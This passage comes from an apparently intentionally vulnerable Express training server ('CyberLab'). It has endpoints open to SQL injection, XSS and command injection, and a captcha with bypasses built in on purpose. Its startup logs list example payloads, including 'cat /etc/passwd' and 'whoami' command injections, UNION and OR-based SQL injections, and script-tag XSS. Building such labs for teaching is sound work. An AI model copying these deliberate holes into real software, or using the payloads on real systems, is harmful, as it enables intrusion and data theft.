      { id: 999, username: 'INJECTED_DATA', email: 'hacker@evil.com', role: 'admin', 
        salary: 999999, credit_card: '1111-2222-3333-4444', ssn: '999-99-9999' }
    ];
  }
  
  if (username) query += ` AND username LIKE '%${username}%'`;
  if (email) query += ` AND email = '${email}'`;
  if (role) query += ` AND role = '${role}'`;
  query += ` ORDER BY ${order_by}`;
  
  res.json({
    success: true,
    stats: results,
    total_records: results.length,
    query_executed: query,
    debug: {
      union_injection_example: "?order_by=username UNION SELECT password,ssn,credit_card,api_key,'','' FROM users--",
      warning: "All financial and personal data exposed!",
      sql_injection_detected: order_by.includes('UNION') || order_by.includes('SELECT')
    }
  });
});

// ============================================
// INICIALIZAÇÃO DO SERVIDOR
// ============================================

app.listen(PORT, () => {
  console.log('🎯 Server Details:');
  console.log(`   🌐 URL: http://localhost:${PORT}`);
  console.log(`   📡 Port: ${PORT}`);
  console.log(`   🔧 Mode: Development`);
  console.log(`   ⚠️ Security: INTENTIONALLY VULNERABLE`);
  console.log('');
  console.log('📋 Available Endpoints:');
  console.log('   GET  /api/status                     - Server status');
  console.log('   GET  /api/vulnerable/users/search    - User search (SQL Injectable)');
  console.log('   GET  /api/vulnerable/users/:id       - User details (SQL Injectable)');  
  console.log('   GET  /api/vulnerable/reports/user-stats - Reports (UNION Injectable)');
  console.log('   GET  /api/xss/reflected              - Reflected XSS demo');
  console.log('   GET  /api/xss/comments               - Stored XSS demo');
  console.log('   POST /api/xss/comments/add           - Add XSS comment');
  console.log('   GET  /api/xss/dom                    - DOM XSS demo');
  console.log('   POST /api/cmd/ping                   - Ping command injection');
  console.log('   POST /api/cmd/network-tools          - Network tools injection');
  console.log('   POST /api/cmd/system-info            - System info injection');
  console.log('');
  console.log('🎓 Educational Examples:');
  console.log('  SQL Injection:');
  console.log("    ?username=admin' OR '1'='1' --");
  console.log("    ?username=' UNION SELECT * FROM users --");
  console.log("    /users/1 OR 1=1");
  console.log("    ?order_by=username UNION SELECT password FROM users--");
  console.log('  XSS Attacks:');
  console.log('    ?search=<script>alert("XSS")</script>');
  console.log('    Comment: <img src=x onerror="alert(\'XSS\')">');
  console.log('  Command Injection:');
  console.log('    host=google.com; whoami');
  console.log('    target=localhost && cat /etc/passwd');
  console.log('    command=ping && ls -la');
  console.log('');
  console.log('✅ CyberLab Backend ready for testing!');
});

// ============================================
// INSECURE CAPTCHA ENDPOINTS
// ============================================

// Generate weak captcha with predictable values
app.get('/api/captcha/generate', (req, res) => {
  const { difficulty = 'easy' } = req.query;
  
  console.log('🤖 Generating Insecure Captcha:', { difficulty });
  
  // Simulated weak captcha generation
  let captcha;
  let captchaId;
  let solution;
  
  switch (difficulty) {
    case 'easy':
      // Very predictable pattern
      captchaId = Math.floor(Math.random() * 10) + 1; // 1-10
      solution = captchaId; // ID equals solution
      captcha = {
        id: captchaId,
        image_data: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA...${captchaId}`, // Fake base64
        width: 100,
        height: 30,
        hint: 'Simple math: What is the captcha ID?'
      };
      break;
      
    case 'medium':
      // Session-based but predictable
      const sessionId = Math.floor(Date.now() / 10000); // Rounded timestamp
      captchaId = sessionId;
      solution = sessionId % 100; // Last 2 digits of session
      captcha = {
        id: captchaId,
        image_data: `data:image/png;base64,session${sessionId}`,
        width: 120,
        height: 35,
        hint: 'Last 2 digits of session ID',
        session_hint: sessionId
      };
      break;
      
    case 'hard':
      // Client-side validation (still bypassable)
      captchaId = Math.random().toString(36).substr(2, 8);
      const mathA = Math.floor(Math.random() * 10) + 1;
      const mathB = Math.floor(Math.random() * 10) + 1;
      solution = mathA + mathB;
      captcha = {
        id: captchaId,
        image_data: `data:image/png;base64,math${mathA}plus${mathB}`,
        width: 150,
        height: 40,
        math_expression: `${mathA} + ${mathB}`,
        client_validation: true // Hint that validation happens client-side
      };
      break;
      
    case 'impossible':
      // Still has flaws - uses fixed algorithm
      captchaId = crypto.randomBytes(16).toString('hex');
      const key = 'cyberlab2024'; // Fixed key
      solution = crypto.createHash('md5').update(captchaId + key).digest('hex').substr(0, 6);
      captcha = {
        id: captchaId,
        image_data: `data:image/png;base64,secure${solution}`,
        width: 200,
        height: 50,
        algorithm: 'MD5 hash with fixed key',
        hint: 'First 6 chars of MD5(captcha_id + "cyberlab2024")'
      };
      break;
  }

  // Store captcha in memory (vulnerable - no expiry, predictable storage)
  if (!global.captchaStore) global.captchaStore = {};
  global.captchaStore[captchaId] = {
    solution,
    generated_at: new Date(),
    difficulty,
    attempts: 0
  };

  res.json({
    success: true,
    captcha,
    debug: {
      difficulty,
      storage_location: 'server_memory',
      predictable_patterns: difficulty === 'easy' ? ['ID equals solution'] : 
                          difficulty === 'medium' ? ['Session based timing'] :
                          difficulty === 'hard' ? ['Client-side validation'] :
                          ['Fixed algorithm key'],
      bypass_hints: {
        easy: 'Try using the captcha ID as the solution',
        medium: 'Calculate session timestamp modulo 100',
        hard: 'Check browser developer tools for validation',
        impossible: 'MD5 hash algorithm with known key'
      }[difficulty]
    }
  });
});

// Verify captcha with multiple bypass vulnerabilities
app.post('/api/captcha/verify', (req, res) => {
  const { captcha_id, solution, bypass_method } = req.body;
  
  console.log('🔓 Verifying Insecure Captcha:', { captcha_id, solution, bypass_method });

  if (!global.captchaStore) global.captchaStore = {};
  const stored = global.captchaStore[captcha_id];

  if (!stored) {
    return res.json({
      success: false,
      error: 'Captcha not found or expired',
      captcha_id,
      debug: {
        stored_captchas: Object.keys(global.captchaStore),
        hint: 'Try generating a captcha first'
      }
    });
  }

  stored.attempts++;
  let isValid = false;
  let bypass_detected = false;
  let method_used = 'normal';

  // Multiple bypass methods
  if (bypass_method) {
    bypass_detected = true;
    switch (bypass_method) {
      case 'bruteforce':
        // Accept any numeric solution under 100
        isValid = !isNaN(solution) && parseInt(solution) >= 0 && parseInt(solution) <= 100;
        method_used = 'brute_force_numeric';
        break;
        
      case 'session_predict':
        // Session-based prediction
        const predictedSolution = parseInt(captcha_id) % 100;
        isValid = parseInt(solution) === predictedSolution;
        method_used = 'session_prediction';
        break;
        
      case 'client_side':
        // Always valid if marked as client-side
        isValid = true;
        method_used = 'client_side_bypass';
        break;
        
      case 'algorithm_exploit':
        // Exploit fixed algorithm
        const key = 'cyberlab2024';
        const expectedHash = crypto.createHash('md5').update(captcha_id + key).digest('hex').substr(0, 6);
        isValid = solution === expectedHash;
        method_used = 'algorithm_exploitation';
        break;
        
      case 'replay_attack':
        // Always accept if replay method is used
        isValid = true;
        method_used = 'replay_attack';
        break;
    }
  } else {
    // Normal validation
    isValid = solution == stored.solution; // Loose comparison vulnerability
    method_used = 'normal_validation';
  }

  const result = {
    success: isValid,
    captcha_verified: isValid,
    captcha_id,
    solution_provided: solution,
    attempts: stored.attempts,
    difficulty: stored.difficulty,
    method_used,
    bypass_detected,
    timing: new Date() - stored.generated_at,
    debug: {
      expected_solution: stored.solution,
      loose_comparison_used: !bypass_method, // Hint about == vs === vulnerability
      vulnerable_aspects: [
        'Predictable generation patterns',
        'No rate limiting on attempts',
        'Loose type comparison (== instead of ===)',
        'Client-side validation hints',
        'Fixed algorithm keys',
        'No CSRF protection'
      ],
      exploitation_examples: {
        easy: 'Use captcha_id as solution',
        medium: 'Calculate: session_id % 100',
        hard: 'Bypass client-side validation',
        impossible: 'MD5(captcha_id + "cyberlab2024").substring(0,6)'
      },
      advanced_bypasses: [
        'POST /api/captcha/verify with bypass_method=bruteforce',
        'POST /api/captcha/verify with bypass_method=client_side',
        'POST /api/captcha/verify with bypass_method=replay_attack'
      ]
    }
  };

  res.json(result);
});

// Get captcha statistics (information disclosure)
app.get('/api/captcha/stats', (req, res) => {
  console.log('📊 Captcha Stats Request');
  
  if (!global.captchaStore) global.captchaStore = {};
  
  const stats = {
    success: true,
    total_captchas: Object.keys(global.captchaStore).length,
    active_sessions: Object.keys(global.captchaStore).map(id => ({
      id: id.length > 10 ? id.substr(0, 10) + '...' : id,
      difficulty: global.captchaStore[id].difficulty,
      attempts: global.captchaStore[id].attempts,
      age_minutes: Math.floor((new Date() - global.captchaStore[id].generated_at) / (1000 * 60)),
      // Information leak - partial solution hints
      solution_hint: global.captchaStore[id].solution.toString().length < 3 ? 
                     global.captchaStore[id].solution : 
                     global.captchaStore[id].solution.toString().substr(0, 2) + '*'
    })),
    debug: {
      warning: 'This endpoint leaks sensitive information about active captchas',
      information_disclosed: [
        'Active captcha IDs',
        'Solution length hints',
        'Attempt counts',
        'Difficulty levels'
      ]
    }
  };

  res.json(stats);
});

// Reset captcha storage (admin function without authentication)
app.delete('/api/captcha/reset', (req, res) => {
  console.log('🗑️ Resetting Captcha Storage');
  
  const cleared = global.captchaStore ? Object.keys(global.captchaStore).length : 0;
  global.captchaStore = {};
  
  res.json({
    success: true,
    message: 'Captcha storage cleared',
    cleared_count: cleared,
    debug: {
      vulnerability: 'No authentication required for admin function',
      impact: 'Any user can clear all active captchas'
    }
  });
});

// ============================================
// ATTACK LOGGING & ANALYTICS DASHBOARD
// ============================================

// Global attack statistics storage
if (!global.attackStats) {
  global.attackStats = {
    total_attacks: 0,
    successful_attacks: 0,
    by_type: {},
    by_difficulty: {},
    by_module: {},
    recent_attacks: [],
    session_stats: {},
    timestamps: []
  };
}

// Log attack attempt
const logAttackAttempt = (type, module, difficulty, payload, success, clientInfo = {}) => {
  const timestamp = new Date();
  const attack = {
    id: Date.now() + Math.random().toString(36),
    timestamp,
    type,
    module,
    difficulty,
    payload: payload.length > 100 ? payload.substring(0, 100) + '...' : payload,
    success,
    client_ip: clientInfo.ip || 'localhost',
    user_agent: clientInfo.userAgent || 'unknown',
    session_id: clientInfo.sessionId || 'anonymous'
  };

  // Update global stats
  global.attackStats.total_attacks++;
  if (success) global.attackStats.successful_attacks++;
  
  // Update by type
  if (!global.attackStats.by_type[type]) global.attackStats.by_type[type] = { total: 0, successful: 0 };
  global.attackStats.by_type[type].total++;
  if (success) global.attackStats.by_type[type].successful++;
  
  // Update by difficulty
  if (!global.attackStats.by_difficulty[difficulty]) global.attackStats.by_difficulty[difficulty] = { total: 0, successful: 0 };
  global.attackStats.by_difficulty[difficulty].total++;
  if (success) global.attackStats.by_difficulty[difficulty].successful++;
  
  // Update by module
  if (!global.attackStats.by_module[module]) global.attackStats.by_module[module] = { total: 0, successful: 0 };
  global.attackStats.by_module[module].total++;
  if (success) global.attackStats.by_module[module].successful++;
  
  // Add to recent attacks (keep last 50)
  global.attackStats.recent_attacks.unshift(attack);
  if (global.attackStats.recent_attacks.length > 50) {
    global.attackStats.recent_attacks = global.attackStats.recent_attacks.slice(0, 50);
  }
  
  // Add timestamp for trending analysis
  global.attackStats.timestamps.push(timestamp);
  if (global.attackStats.timestamps.length > 1000) {
    global.attackStats.timestamps = global.attackStats.timestamps.slice(-1000);
  }
  
  console.log(`📊 Attack Logged: ${type} on ${module} (${difficulty}) - ${success ? 'SUCCESS' : 'FAILED'}`);
  return attack;
};

// Get dashboard analytics
app.get('/api/analytics/dashboard', (req, res) => {
  console.log('📈 Analytics Dashboard Request');
  
  const stats = global.attackStats;
  
  // Calculate success rates
  const overall_success_rate = stats.total_attacks > 0 ? 
    ((stats.successful_attacks / stats.total_attacks) * 100).toFixed(1) : 0;
  
  // Get top attack types
  const top_attack_types = Object.entries(stats.by_type)
    .sort(([,a], [,b]) => b.total - a.total)
    .slice(0, 5)
    .map(([type, data]) => ({
      type,
      total: data.total,
      successful: data.successful,
      success_rate: data.total > 0 ? ((data.successful / data.total) * 100).toFixed(1) : 0
    }));
  
  // Get module statistics
  const module_stats = Object.entries(stats.by_module)
    .sort(([,a], [,b]) => b.total - a.total)
    .map(([module, data]) => ({
      module,
      total: data.total,
      successful: data.successful,
      success_rate: data.total > 0 ? ((data.successful / data.total) * 100).toFixed(1) : 0
    }));
  
  // Calculate hourly attack trends (last 24 hours)
  const now = new Date();
  const hourlyTrends = Array.from({ length: 24 }, (_, i) => {
    const hour = new Date(now.getTime() - (23 - i) * 60 * 60 * 1000);
    const hourStart = new Date(hour.getFullYear(), hour.getMonth(), hour.getDate(), hour.getHours());
    const hourEnd = new Date(hourStart.getTime() + 60 * 60 * 1000);
    
    const attacks_in_hour = stats.timestamps.filter(t => 
      new Date(t) >= hourStart && new Date(t) < hourEnd
    ).length;
    
    return {
      hour: hourStart.getHours(),
      attacks: attacks_in_hour,
      label: hourStart.toLocaleTimeString('en-US', { hour: '2-digit', hour12: false })
    };
  });

  const response = {
    success: true,
    overview: {
      total_attacks: stats.total_attacks,
      successful_attacks: stats.successful_attacks,
      failed_attacks: stats.total_attacks - stats.successful_attacks,
      overall_success_rate: parseFloat(overall_success_rate),
      active_since: stats.timestamps.length > 0 ? stats.timestamps[0] : null
    },
    top_attack_types,
    module_stats,
    difficulty_breakdown: Object.entries(stats.by_difficulty).map(([difficulty, data]) => ({
      difficulty,
      total: data.total,
      successful: data.successful,
      success_rate: data.total > 0 ? ((data.successful / data.total) * 100).toFixed(1) : 0
    })),
    recent_attacks: stats.recent_attacks.slice(0, 10),
    hourly_trends: hourlyTrends,
    debug: {
      server_uptime: process.uptime(),
      memory_usage: process.memoryUsage(),
      total_stored_attacks: stats.recent_attacks.length
    }
  };

  res.json(response);
});

// Get detailed attack history
app.get('/api/analytics/attacks', (req, res) => {
  const { limit = 20, offset = 0, module, type, difficulty } = req.query;
  
  console.log('🔍 Attack History Request:', { limit, offset, module, type, difficulty });
  
  let attacks = global.attackStats.recent_attacks;
  
  // Apply filters
  if (module) attacks = attacks.filter(a => a.module === module);
  if (type) attacks = attacks.filter(a => a.type === type);
  if (difficulty) attacks = attacks.filter(a => a.difficulty === difficulty);
  
  // Apply pagination
  const startIndex = parseInt(offset);
  const endIndex = startIndex + parseInt(limit);
  const paginatedAttacks = attacks.slice(startIndex, endIndex);
  
  res.json({
    success: true,
    attacks: paginatedAttacks,
    total: attacks.length,
    pagination: {
      offset: parseInt(offset),
      limit: parseInt(limit),
      has_more: endIndex < attacks.length
    }
  });
});

// Reset analytics (for testing)
app.delete('/api/analytics/reset', (req, res) => {
  console.log('🗑️ Analytics Reset Request');
  
  const oldTotal = global.attackStats.total_attacks;
  
  global.attackStats = {
    total_attacks: 0,
    successful_attacks: 0,
    by_type: {},
    by_difficulty: {},
    by_module: {},
    recent_attacks: [],
    session_stats: {},
    timestamps: []
  };
  
  res.json({
    success: true,
    message: 'Analytics data reset successfully',
    previous_total_attacks: oldTotal,
    debug: {
      vulnerability: 'No authentication required for analytics reset',
      impact: 'Any user can clear attack statistics'
    }
  });
});

// Integration helper - call this from other endpoints to log attacks
const integrateAttackLogging = () => {
  console.log('🔗 Integrating attack logging into existing endpoints...');
  
  // This would be called from existing vulnerable endpoints
  // For now, we'll add some sample data
  setTimeout(() => {
    // Simulate some historical attacks for demo
    const sampleAttacks = [
      { type: 'SQL Injection', module: 'sql-injection', difficulty: 'easy', payload: "' OR '1'='1", success: true },
      { type: 'XSS', module: 'xss', difficulty: 'medium', payload: '<script>alert("XSS")</script>', success: true },
      { type: 'Command Injection', module: 'command-injection', difficulty: 'hard', payload: '127.0.0.1; whoami', success: true },
      { type: 'CSRF', module: 'csrf', difficulty: 'easy', payload: 'csrf_token=fake', success: false },
      { type: 'File Upload', module: 'file-upload', difficulty: 'medium', payload: 'shell.php.jpg', success: true }
    ];
    
    sampleAttacks.forEach((attack, index) => {
      setTimeout(() => {
        logAttackAttempt(
          attack.type, 
          attack.module, 
          attack.difficulty, 
          attack.payload, 
          attack.success,
          { ip: '127.0.0.1', userAgent: 'CyberLab-TestAgent', sessionId: `demo-${index}` }
        );
      }, index * 100);
    });
  }, 1000);
};

// Initialize demo data
integrateAttackLogging();

// Tratamento de erros global
app.use((error, req, res, next) => {
  console.error('❌ Server Error:', error);
  res.status(500).json({
    success: false,
    error: error.message,
    stack: error.stack,
    debug: 'This error information would not be exposed in a secure application'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    requested_url: req.originalUrl,
    method: req.method,
    available_endpoints: [
      'GET /api/status',
      'GET /api/vulnerable/users/search',
      'GET /api/vulnerable/users/:id',
      'GET /api/vulnerable/reports/user-stats',
      'GET /api/xss/reflected',
      'GET /api/xss/comments',
      'POST /api/xss/comments/add',
      'GET /api/xss/dom',
      'POST /api/cmd/ping',
      'POST /api/cmd/network-tools',
      'GET /api/cmd/system-info',
      'GET /api/captcha/generate',
      'POST /api/captcha/verify',
      'GET /api/captcha/stats',
      'DELETE /api/captcha/reset',
      'GET /api/analytics/dashboard',
      'GET /api/analytics/attacks',
      'DELETE /api/analytics/reset'
    ]
  });
});